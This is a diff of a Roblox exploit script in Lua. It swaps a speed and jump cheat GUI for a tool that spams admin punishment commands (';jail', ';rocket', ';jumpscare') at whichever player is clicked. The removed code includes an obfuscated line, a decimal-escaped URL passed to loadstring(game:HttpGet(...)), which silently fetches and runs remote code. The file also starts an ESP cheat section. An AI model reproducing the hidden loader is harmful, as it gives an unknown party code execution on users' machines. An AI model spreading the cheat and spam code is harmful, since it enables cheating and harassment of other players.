@@ -272,255 +272,192 @@ SpeedButton.Activated:Connect(function()
     end
 end)
 
---[[
-Why buy light when you got rehub?
-btw kanye is a grown ass man
-discord.gg/rehub
---]]
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
 
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
+local LocalPlayer = Players.LocalPlayer
 
--- ================== GUI ==================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "KanyeHubBooster"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DaddyJaysAPSpammer"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 280, 0, 240)
-mainFrame.Position = UDim2.new(1, -300, 0, 20)
-mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-mainFrame.BackgroundTransparency = 0.05
-mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-mainFrame.Parent = screenGui
+-- VERY SMALL Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.fromOffset(180, 200)
+MainFrame.Position = UDim2.fromScale(0.5, 0.45)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 20)
-corner.Parent = mainFrame
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = MainFrame
 
--- Title
-local title = Instance.new("TextLabel")
-title.Text = "KANYEHUB BOOSTER ▼"
-title.Font = Enum.Font.LuckiestGuy
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 28
-title.BackgroundTransparency = 1
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.Parent = mainFrame
+-- Title Bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 28)
+TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
 
--- Speed Row
-local speedLabel = Instance.new("TextLabel")
-speedLabel.Text = "Speed"
-speedLabel.Font = Enum.Font.Gotham
-speedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-speedLabel.TextSize = 20
-speedLabel.BackgroundTransparency = 1
-speedLabel.Size = UDim2.new(0.5, -10, 0, 30)
-speedLabel.Position = UDim2.new(0, 20, 0, 45)
-speedLabel.TextXAlignment = Enum.TextXAlignment.Left
-speedLabel.Parent = mainFrame
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 12)
+TitleCorner.Parent = TitleBar
 
-local speedBox = Instance.new("Frame")
-speedBox.Size = UDim2.new(0, 100, 0, 30)
-speedBox.Position = UDim2.new(1, -120, 0, 45)
-speedBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-speedBox.Parent = mainFrame
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, -28, 1, 0)
+TitleLabel.Position = UDim2.new(0, 6, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "daddy jays ap spammer"
+TitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+TitleLabel.TextScaled = true
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TitleBar
 
-local boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 8)
-boxCorner.Parent = speedBox
+-- Minimize Button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 22, 0, 22)
+MinimizeButton.Position = UDim2.new(1, -24, 0, 3)
+MinimizeButton.Text = "-"
+MinimizeButton.TextScaled = true
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.TextColor3 = Color3.fromRGB(255,255,255)
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(25,25,25)
+MinimizeButton.Parent = TitleBar
 
-local speedValue = Instance.new("TextBox")
-speedValue.Text = "25"
-speedValue.Font = Enum.Font.Gotham
-speedValue.TextColor3 = Color3.fromRGB(255, 255, 255)
-speedValue.TextSize = 20
-speedValue.BackgroundTransparency = 1
-speedValue.Size = UDim2.new(1, 0, 1, 0)
-speedValue.Parent = speedBox
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 6)
+MinCorner.Parent = MinimizeButton
 
--- Jump Row
-local jumpLabel = Instance.new("TextLabel")
-jumpLabel.Text = "Jump"
-jumpLabel.Font = Enum.Font.Gotham
-jumpLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-jumpLabel.TextSize = 20
-jumpLabel.BackgroundTransparency = 1
-jumpLabel.Size = UDim2.new(0.5, -10, 0, 30)
-jumpLabel.Position = UDim2.new(0, 20, 0, 85)
-jumpLabel.TextXAlignment = Enum.TextXAlignment.Left
-jumpLabel.Parent = mainFrame
+-- Player List
+local Scroll = Instance.new("ScrollingFrame")
+Scroll.Position = UDim2.new(0, 0, 0, 32)
+Scroll.Size = UDim2.new(1, 0, 1, -34)
+Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+Scroll.ScrollBarImageColor3 = Color3.fromRGB(40,40,40)
+Scroll.BackgroundTransparency = 1
+Scroll.Parent = MainFrame
 
-local jumpBox = Instance.new("Frame")
-jumpBox.Size = UDim2.new(0, 100, 0, 30)
-jumpBox.Position = UDim2.new(1, -120, 0, 85)
-jumpBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-jumpBox.Parent = mainFrame
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 4)
+UIListLayout.Parent = Scroll
 
-boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 8)
-boxCorner.Parent = jumpBox
+-- Dragging
+local dragging = false
+local dragStart, startPos
 
-local jumpValue = Instance.new("TextBox")
-jumpValue.Text = "40"
-jumpValue.Font = Enum.Font.Gotham
-jumpValue.TextColor3 = Color3.fromRGB(255, 255, 255)
-jumpValue.TextSize = 20
-jumpValue.BackgroundTransparency = 1
-jumpValue.Size = UDim2.new(1, 0, 1, 0)
-jumpValue.Parent = jumpBox
-
--- Keybind Row
-local keybindLabel = Instance.new("TextLabel")
-keybindLabel.Text = "Keybind"
-keybindLabel.Font = Enum.Font.Gotham
-keybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-keybindLabel.TextSize = 20
-keybindLabel.BackgroundTransparency = 1
-keybindLabel.Size = UDim2.new(0.5, -10, 0, 30)
-keybindLabel.Position = UDim2.new(0, 20, 0, 125)
-keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
-keybindLabel.Parent = mainFrame
-
-local keybindBox = Instance.new("Frame")
-keybindBox.Size = UDim2.new(0, 100, 0, 30)
-keybindBox.Position = UDim2.new(1, -120, 0, 125)
-keybindBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-keybindBox.Parent = mainFrame
-
-boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 8)
-boxCorner.Parent = keybindBox
-
-local keybindValue = Instance.new("TextBox")
-keybindValue.Text = "T"
-keybindValue.Font = Enum.Font.Gotham
-keybindValue.TextColor3 = Color3.fromRGB(255, 255, 255)
-keybindValue.TextSize = 20
-keybindValue.BackgroundTransparency = 1
-keybindValue.Size = UDim2.new(1, 0, 1, 0)
-keybindValue.Parent = keybindBox
-
--- Activate Button
-local activateBtn = Instance.new("TextButton")
-activateBtn.Size = UDim2.new(0.8, 0, 0, 40)
-activateBtn.Position = UDim2.new(0.1, 0, 0, 165)
-activateBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-activateBtn.Text = "ACTIVATE"
-activateBtn.Font = Enum.Font.LuckiestGuy
-activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-activateBtn.TextSize = 28
-activateBtn.Parent = mainFrame
-
-boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 8)
-boxCorner.Parent = activateBtn
-
--- Discord Label
-local discordLabel = Instance.new("TextLabel")
-discordLabel.Text = "DISCORD.GG/KANYEHUB"
-discordLabel.Font = Enum.Font.LuckiestGuy
-discordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-discordLabel.TextSize = 20
-discordLabel.BackgroundTransparency = 1
-discordLabel.Size = UDim2.new(1, 0, 0, 30)
-discordLabel.Position = UDim2.new(0, 0, 1, -35)
-discordLabel.Parent = mainFrame
-
--- ================== SETTINGS ==================
-local speed = 25
-local jump = 40
-local keybind = Enum.KeyCode.T
-local activated = false
-local keybindConnection
-
--- Update Values
-speedValue.FocusLost:Connect(function()
-    speed = tonumber(speedValue.Text) or 25
-    speedValue.Text = tostring(speed)
-end)
-
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\97\100\66\102\119\122\65\102\47\114\97\119"))()
-jumpValue.FocusLost:Connect(function()
-    jump = tonumber(jumpValue.Text) or 40
-    jumpValue.Text = tostring(jump)
-end)
-
--- Keybind Setting
-keybindValue.Focused:Connect(function()
-    keybindConnection = UserInputService.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
-            keybind = input.KeyCode
-            keybindValue.Text = input.KeyCode.Name
-            keybindValue:ReleaseFocus()
-        end
-    end)
-end)
-
-keybindValue.FocusLost:Connect(function()
-    if keybindConnection then
-        keybindConnection:Disconnect()
-        keybindConnection = nil
-    end
-end)
-
--- Activate Toggle
-activateBtn.MouseButton1Click:Connect(function()
-    activated = not activated
-    activateBtn.Text = activated and "DEACTIVATE" or "ACTIVATE"
-end)
-
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    if input.KeyCode == keybind then
-        activated = not activated
-        activateBtn.Text = activated and "DEACTIVATE" or "ACTIVATE"
-    end
-end)
-
--- Boost Loop
-RunService.Heartbeat:Connect(function()
-    if activated and humanoid then
-        humanoid.WalkSpeed = speed
-        humanoid.JumpPower = jump
-    end
-end)
-
--- Handle Respawn
-player.CharacterAdded:Connect(function(newChar)
-    character = newChar
-    humanoid = newChar:WaitForChild("Humanoid")
-end)
-
--- Drag GUI
-local dragging, dragStart, startPos
-mainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = mainFrame.Position
-    end
-end)
-
-mainFrame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
+TitleBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 
+	or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = MainFrame.Position
+	end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement 
+	or input.UserInputType == Enum.UserInputType.Touch) then
+		
+		local delta = input.Position - dragStart
+		MainFrame.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
 end)
+
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 
+	or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = false
+	end
+end)
+
+-- Minimize
+local minimized = false
+local normalSize = MainFrame.Size
+
+MinimizeButton.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	
+	if minimized then
+		Scroll.Visible = false
+		MainFrame.Size = UDim2.fromOffset(180, 28)
+		MinimizeButton.Text = "+"
+	else
+		Scroll.Visible = true
+		MainFrame.Size = normalSize
+		MinimizeButton.Text = "-"
+	end
+end)
+
+-- Send Commands (space format)
+local function sendCommands(targetName)
+	local commands = {
+		";balloon "..targetName,
+		";rocket "..targetName,
+		";morph "..targetName,
+		";jumpscare "..targetName,
+		";jail "..targetName
+	}
+
+	local channel = TextChatService.TextChannels.RBXGeneral
+	for _, cmd in ipairs(commands) do
+		channel:SendAsync(cmd)
+		task.wait(0.12)
+	end
+end
+
+-- Player Buttons
+local function createPlayerButton(player)
+	if player == LocalPlayer then return end
+	
+	local Button = Instance.new("TextButton")
+	Button.Size = UDim2.new(1, -6, 0, 24)
+	Button.BackgroundColor3 = Color3.fromRGB(20,20,20)
+	Button.TextColor3 = Color3.fromRGB(255,255,255)
+	Button.TextScaled = true
+	Button.Font = Enum.Font.Gotham
+	Button.Text = player.Name
+	Button.Parent = Scroll
+	
+	local Corner = Instance.new("UICorner")
+	Corner.CornerRadius = UDim.new(0, 6)
+	Corner.Parent = Button
+	
+	Button.MouseButton1Click:Connect(function()
+		sendCommands(player.Name)
+	end)
+end
+
+-- Refresh List
+local function refreshList()
+	for _, child in pairs(Scroll:GetChildren()) do
+		if child:IsA("TextButton") then
+			child:Destroy()
+		end
+	end
+	
+	for _, player in pairs(Players:GetPlayers()) do
+		createPlayerButton(player)
+	end
+	
+	task.wait()
+	Scroll.CanvasSize = UDim2.new(0,0,0,UIListLayout.AbsoluteContentSize.Y + 4)
+end
+
+Players.PlayerAdded:Connect(refreshList)
+Players.PlayerRemoving:Connect(refreshList)
+
+refreshList()
 
 -- ========== ESP FRAME ==========
 local ESPFrame = Instance.new("Frame")
